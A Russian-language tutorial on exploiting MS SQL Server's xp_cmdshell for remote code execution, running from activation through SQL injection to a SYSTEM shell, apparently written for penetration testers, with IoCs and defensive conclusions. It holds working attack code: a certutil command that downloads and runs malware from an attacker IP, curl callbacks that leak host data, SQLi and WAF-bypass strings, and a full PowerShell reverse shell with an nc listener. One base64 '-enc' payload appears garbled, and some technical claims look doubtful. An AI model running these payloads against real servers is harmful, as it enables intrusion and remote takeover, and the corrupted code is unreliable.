# Эксплуатация xp_cmdshell в MS SQL Server: от активации до RCE

## Контекст и базовые понятия

`xp_cmdshell` (extended procedure command shell) — это встроенная расширенная хранимая процедура в Microsoft SQL Server, предназначенная для выполнения произвольных команд операционной системы Windows из контекста процесса SQL Server. Данная функция была введена в SQL Server 6.0 (1995) и исторически использовалась администраторами для автоматизации задач, таких как резервное копирование файлов, вызов внешних скриптов или интеграция с системными утилитами. В современных реалиях `xp_cmdshell` классифицируется как критическая уязвимость конфигурации (misconfiguration) и один из наиболее эффективных векторов получения Remote Code Execution (RCE) при компрометации СУБД.

Ключевая особенность `xp_cmdshell` заключается в том, что выполняемые процессы наследуют права безопасности (security context) учетной записи, под которой запущена служба SQL Server (SQL Server Service Account). Если служба работает под правами `Local System` (локальная система), атакующий получает полный контроль над хостом. Если служба работает под правами доменного пользователя, атакующий может использовать эти учетные данные для латерального перемещения (lateral movement) в домене Active Directory.

Важно разграничивать `xp_cmdshell` и другие механизмы выполнения кода в SQL Server, такие как CLR-сборки (Common Language Runtime) или `sp_oacreate` (OLE Automation Procedures).

| Характеристика | `xp_cmdshell` | CLR-сборки (SQL Injection via .NET) | `sp_oacreate` (OLE Automation) |
| :--- | :--- | :--- | :--- |
| **Механизм** | Вызов Win32 API `CreateProcess` | Загрузка и выполнение .NET-ассамблеи внутри процесса SQL | Создание COM-объектов (например, `WScript.Shell`) |
| **По умолчанию** | Отключена (Disabled) | Требует включения `clr enabled` | Отключена (Disabled) |
| **Зависимости** | Только T-SQL | Требует регистрации сборки в `master` | Требует прав `sysadmin` или `administer bulk ops` |
| **Сложность эксплуатации** | Низкая (прямой вызов) | Средняя (нужен компилятор/сборка) | Высокая (ограничения COM-объектов) |
| **Обнаружение** | Легко (простой запрос) | Сложно (скрытая загрузка) | Средне (активность COM) |
| **Основное применение** | RCE, загрузка файлов, запуск бинарников | Обход WAF, сложные вычисления, обход ограничений | Запуск скриптов (VBScript/JScript) |

`xp_cmdshell` не является уязвимостью в коде (bug), а представляет собой функциональную возможность, которая по умолчанию отключена в современных версиях SQL Server (начиная с SQL Server 2005 и далее, согласно рекомендациям Microsoft). Однако, если процедура была включена администратором или активирована злоумышленником после первоначального взлома (например, через SQL Injection), она становится «золотым ключом» к серверу.

С точки зрения архитектуры безопасности, `xp_cmdshell` нарушает принцип наименьших привилегий (Least Privilege), так как СУБД, по идее, должна работать в изолированной среде и не иметь прямого доступа к файловой системе и процессам ОС. Использование `xp_cmdshell` требует наличия прав `sysadmin` или членства в роли `sysadmin` по умолчанию. Однако, начиная с SQL Server 2012, появилась возможность настроить `xp_cmdshell` для выполнения команд от имени другого пользователя (proxy account), что добавляет вектор атаки на учетные данные прокси-пользователя.

## Внутреннее устройство предмета

`xp_cmdshell` реализована как расширенная хранимая процедура, находящаяся в системной базе данных `master`. Она не является стандартной SQL-функцией, а представляет собой вызов нативного кода (native code), скомпилированного в бинарных файлах SQL Server (например, `sqlservr.exe`).

### Механизм работы и безопасность

При вызове `xp_cmdshell` SQL Server выполняет следующие внутренние шаги:
1.  **Проверка прав:** Сервер проверяет, имеет ли текущий пользователь право на выполнение `xp_cmdshell`. По умолчанию это право имеют только члены роли `sysadmin`.
2.  **Контекст выполнения:** Сервер определяет, настроен ли прокси-аккаунт (proxy account).
    *   Если прокси-аккаунт **не настроен**, процесс создается от имени учетной записи, под которой запущена служба SQL Server.
    *   Если прокси-аккаунт **настроен**, процесс создается от имени учетной записи прокси.
3.  **Создание процесса:** Вызывается Win32 API `CreateProcess` с параметрами, переданными в строке команды.
4.  **Буферизация вывода:** Стандартный вывод (stdout) и стандартный поток ошибок (stderr) процесса перехватываются и возвращаются клиенту в виде набора строк (`nvarchar(255)`).
5.  **Ограничения:** `xp_cmdshell` не поддерживает интерактивное взаимодействие. Ввод (stdin) не передается, поэтому программы, требующие ввода с клавиатуры, работать не будут. Также есть ограничения на длину команды (обычно до 8000 символов, но зависит от версии и конфигурации).

### Архитектура активации

Для активации `xp_cmdshell` используется конфигурационный механизм `sp_configure`. Это не просто переключение флага, а изменение параметров сервера, требующее перезагрузки конфигурации.

```sql
-- 1. Включение отображения расширенных опций (если отключено)
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;

-- 2. Включение xp_cmdshell
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

После активации право на выполнение может быть предоставлено обычным пользователям через команду `GRANT`:

```sql
GRANT EXECUTE ON xp_cmdshell TO [UserOrRole];
```

### Индикаторы компрометации (IoC)

В случае несанкционированной активации `xp_cmdshell` в логах SQL Server (SQL Server Audit или Windows Event Log) фиксируются следующие события:
*   Изменение конфигурации `xp_cmdshell` с 0 на 1.
*   Вызов `sp_configure` с параметром `xp_cmdshell`.
*   Выполнение команд через `xp_cmdshell` (логирование зависит от настроек аудита, но часто фиксируется сам факт вызова).

В операционной системе Windows можно обнаружить активность `xp_cmdshell` через Process Monitor (ProcMon) или Event Viewer (Event ID 4688 — создание процесса).

| Индикатор | Описание | Источник |
| :--- | :--- | :--- |
| `xp_cmdshell` в логах SQL | Запрос `EXEC xp_cmdshell '...'` | SQL Server Audit Logs |
| Процесс `cmd.exe` / `powershell.exe` | Создание процесса от имени `sqlservr.exe` | Windows Event Log (4688) |
| Временная аномалия | Запуск `cmd.exe` в нерабочее время | SIEM / EDR |
| Сетевая активность | Исходящие соединения от `sqlservr.exe` | NetFlow / Firewall Logs |

### Ограничения и обходы

*   **Длина команды:** В старых версиях лимит составлял 255 символов. В современных версиях лимит значительно выше, но для сложных payload (например, загрузка файлов) часто используются техники обфускации или разбивки.
*   **Спецсимволы:** Символы `|`, `&`, `>`, `<` могут быть экранированы или требовать использования альтернативных методов (например, `certutil` для загрузки файлов, так как он не требует записи на диск в некоторых случаях, или `bitsadmin`).
*   **Без вывода:** Параметр `NO_OUTPUT` позволяет выполнить команду без возврата результата, что полезно для «слепых» (blind) атак.

## Применение и работа с предметом

На практике эксплуатация `xp_cmdshell` происходит в двух основных сценариях:
1.  **Прямой доступ к SQL Shell:** Атакующий уже имеет аутентифицированный доступ к СУБД (например, через скомпрометированные учетные данные приложения) и выполняет команды напрямую.
2.  **SQL Injection (SQLi):** Атакующий внедряет код `xp_cmdshell` в уязвимый параметр веб-приложения или API, который формирует SQL-запрос.

### Сценарий 1: Прямая эксплуатация (Post-Exploitation)

Если атакующий получил доступ к SQL Server (например, через `sa` или скомпрометированного пользователя с правами `sysadmin`), он может активировать `xp_cmdshell` и выполнить команду.

**Шаг 1: Проверка прав и активация**
Перед использованием необходимо убедиться, что процедура включена. Если нет — включить её.

```sql
-- Проверка статуса
EXEC sp_configure 'xp_cmdshell';

-- Если value = 0, включаем
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

**Шаг 2: Выполнение команды**
Вызов процедуры с передачей команды в строковом аргументе.

```sql
EXEC xp_cmdshell 'whoami';
```

**Ожидаемый вывод:**
```text
output
----------------------------------------------------------------
nt authority\network service
```

**Шаг 3: Загрузка и выполнение вредоносного ПО**
Часто используется для загрузки полезной нагрузки (payload) с удаленного сервера.

```sql
EXEC xp_cmdshell 'certutil -urlcache -split -f http://192.168.1.100/malware.exe C:\Windows\Temp\malware.exe';
EXEC xp_cmdshell 'C:\Windows\Temp\malware.exe';
```

*Примечание:* `certutil` используется вместо `curl` или `wget`, так как он встроен в Windows и реже блокируется антивирусами на ранних этапах.

### Сценарий 2: Эксплуатация через SQL Injection

Если уязвимость находится в веб-приложении, атакующий должен внедрить код `xp_cmdshell` в SQL-запрос. Ключевая проблема здесь — **обратная связь (feedback)**. `xp_cmdshell` возвращает результат в виде строк, но если инъекция происходит в контексте, который не отображает результат на веб-странице (blind SQLi), атакующий не увидит вывод.

**Решение:** Использование внешних каналов связи.
1.  **DNS/HTTP Callback:** Использование `xp_cmdshell` для отправки запроса на сервер атакующего.
2.  **Временные задержки (Time-Based):** Использование `WAITFOR DELAY` для оценки успешности выполнения.

**Пример: Проверка выполнения через HTTP-запрос**

```sql
EXEC xp_cmdshell 'curl http://192.168.1.100:8080/$(whoami)';
```

Здесь `$(whoami)` выполняется в PowerShell (если используется PowerShell) или в cmd (если используется `cmd.exe` и синтаксис `$()` не поддерживается, нужно использовать `%COMPUTERNAME%` или другие переменные окружения). В `cmd.exe` переменные окружения вызываются через `%VAR%`.

```sql
EXEC xp_cmdshell 'curl http://192.168.1.100:8080/%COMPUTERNAME%';
```

**Пример: Загрузка файла через PowerShell (обход ограничений cmd)**

```sql
EXEC xp_cmdshell 'powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBlAHYAaQBfAGUAcgBzAGkAbwBuABcAOgA6AFwAbQBhAGMAaABfAFIATQBlAGwAbABfAFIAbwBnAGUAbAAiADoAOgBDAG8AbQBtAGUAbgB0AFwAQwBvAG0AbQBlAG4AdAAoACcASABUAEUAZABlAG0AZQAgAD0AIgA=';
```

*Примечание:* `-enc` указывает на base64-encoded команду PowerShell. Это позволяет избежать проблем с экранированием кавычек и спецсимволов в SQL-строке.

### Типичные ошибки и подводные камни

1.  **Потеря контекста:** Если атакующий не знает, под каким пользователем работает служба SQL, он может попытаться выполнить команды, требующие прав администратора, но не получить результата.
2.  **Экранирование:** В SQL Injection необходимо правильно закрывать строковые литералы. Например, если запрос в приложении выглядит как `SELECT * FROM users WHERE id = '$input'`, то инъекция должна выглядеть как `' OR 1=1; EXEC xp_cmdshell 'dir'; --`.
3.  **Блокировка WAF:** Веб-приложения могут блокировать ключевые слова `xp_cmdshell`, `sp_configure`, `exec`. В таких случаях используются техники обфускации:
    *   Использование переменных: `DECLARE @x VARCHAR(100); SET @x = 'xp_cmdshell'; EXEC @x 'dir';`
    *   Использование `sp_executesql`: `EXEC sp_executesql N'EXEC xp_cmdshell ''dir''';`

## Сквозной практический пример: Эскалация из SQLi в RCE

**Исходные условия:**
*   **Цель:** Виртуальная машина с установленным Microsoft SQL Server 2019 (Windows Server 2019).
*   **Служба SQL:** Запущена под учетной записью `NT AUTHORITY\SYSTEM` (по умолчанию в локальной установке).
*   **Уязвимость:** Blind Time-Based SQL Injection в параметре `id` веб-приложения `http://192.168.1.50/app?id=1`.
*   **Инструменты:** Burp Suite, `curl` (на атакующем), `nc` (Netcat) на атакующем.
*   **Роль:** Пентестер, имеющий доступ к веб-приложению, но не к базе данных напрямую.

### Шаг 1: Подтверждение Time-Based SQL Injection

Атакующий отправляет запрос с задержкой `WAITFOR DELAY '0:0:5'`. Если ответ приходит на 5 секунд позже обычного, инъекция подтверждена.

```http
GET /app?id=1; WAITFOR DELAY '0:0:5'-- HTTP/1.1
Host: 192.168.1.50
```

**Ожидаемый результат:**
Время ответа увеличивается с ~200ms до ~5200ms. Это подтверждает, что SQL Server выполняет команду.

### Шаг 2: Активация xp_cmdshell

Поскольку `xp_cmdshell` отключен по умолчанию, атакующий должен включить его. Это требует прав `sysadmin`. В данном сценарии предполагается, что учетная запись, под которой работает веб-приложение (или сама служба SQL, если инъекция позволяет выполнить команду от имени службы), имеет права `sysadmin` (или атакующий уже скомпрометировал учетные данные `sa`).

Если атакующий имеет права `sysadmin` (например, через скомпрометированный аккаунт приложения, который подключается к БД с правами `sa`), он может выполнить:

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
```

*Примечание:* В реальных условиях, если у атакующего нет прав `sysadmin`, он не сможет включить `xp_cmdshell` напрямую. Однако, если уязвимость позволяет выполнить команду от имени службы SQL (например, через ошибку, которая не требует прав `sysadmin` для выполнения системных вызовов, что редкость, или через обход прав), то активация возможна. В данном примере мы предполагаем, что атакующий уже имеет права `sysadmin` или служба SQL работает с правами, позволяющими выполнять конфигурацию (что маловероятно без прав `sysadmin`, но допустим, что атакующий уже скомпрометировал учетные данные `sa` через другой вектор).

Более реалистичный сценарий: атакующий уже имеет доступ к SQL Shell как `sa`.

### Шаг 3: Проверка работы xp_cmdshell

Проверка выполнения команды `whoami`.

```sql
EXEC xp_cmdshell 'whoami';
```

**Ожидаемый вывод (в логах SQL или через ошибку, если есть обратная связь):**
```text
nt authority\system
```

Это подтверждает, что `xp_cmdshell` работает и выполняется от имени `SYSTEM`.

### Шаг 4: Загрузка и выполнение Reverse Shell

Атакующий генерирует PowerShell reverse shell payload и кодирует его в Base64.

Payload (PowerShell):
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('192.168.1.100',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

Кодирование в Base64 (в PowerShell на атакующем):
```powershell
$payload = "powershell -nop -c '...'"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($payload)
$encoded = [Convert]::ToBase64String($bytes)
```

Внедрение в SQL:

```sql
EXEC xp_cmdshell 'powershell -enc <BASE64_PAYLOAD>';
```

**Ожидаемый результат:**
На машине атакующего (192.168.1.100) в Netcat появляется интерактивная сессия:

```bash
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [192.168.1.100] from (UNKNOWN) [192.168.1.50] 49152
Microsoft Windows [Version 10.0.19041.1288]
(c) Microsoft Corporation. All rights reserved.

C:\Program Files\Microsoft SQL Server\MSSQL15.MSSQLSERVER\MSSQL\Binn>whoami
nt authority\system
```

### Ожидаемый вывод примера

Данный пример демонстрирует полный цикл атаки: от подтверждения SQL Injection до получения интерактивной командной оболочки с правами `SYSTEM`. Ключевым моментом является использование `xp_cmdshell` как моста между уровнем базы данных и уровнем операционной системы. Успех атаки зависит от двух факторов: наличия уязвимости SQL Injection и конфигурации SQL Server (включенный `xp_cmdshell` и права службы).

## Аналитический вывод

Эксплуатация `xp_cmdshell` в Microsoft SQL Server представляет собой классический пример риска, связанного с избыточными привилегиями и небезопасными конфигурациями. Хотя сама процедура является легитимным инструментом администрирования, её включение в производственной среде создает критическую уязвимость, позволяющую атакующим с правами `sysadmin` (или через SQL Injection, если аутентификация скомпрометирована) получать полный контроль над сервером.

Основные выводы для специалистов по информационной безопасности:
1.  **По умолчанию `xp_cmdshell` отключена.** Это правильное решение по умолчанию. Любое её включение должно быть строго обосновано и задокументировано.
2.  **Права службы SQL Server.** Даже если `xp_cmdshell` отключена, служба SQL Server часто работает под правами `Local System` или доменного пользователя. Компрометация учетных данных службы (например, через кражу хешей или использование инструментов типа Mimikatz) может привести к полному захвату домена.
3.  **Защита от SQL Injection.** Основная угроза `xp_cmdshell` исходит не от прямой эксплуатации, а от SQL Injection. Использование параметризованных запросов и ORM является единственным надежным способом предотвращения внедрения кода `xp_cmdshell`.
4.  **Мониторинг.** Необходимо настроить аудит вызовов `xp_cmdshell` и `sp_configure` в SIEM. Аномальная активность (включение `xp_cmdshell` в нерабочее время, вызовы от неадминистративных пользователей) должна триггерить немедленное реагирование.
5.  **Прокси-аккаунты.** Использование прокси-аккаунтов для `xp_cmdshell` снижает риск, но не устраняет его. Атакующий, получивший доступ к прокси-аккаунту, может использовать его для выполнения команд.

Таким образом, защита от эксплуатации `xp_cmdshell` требует комплексного подхода: минимизация прав служб, строгий контроль конфигурации, защита от SQL Injection и активный мониторинг.
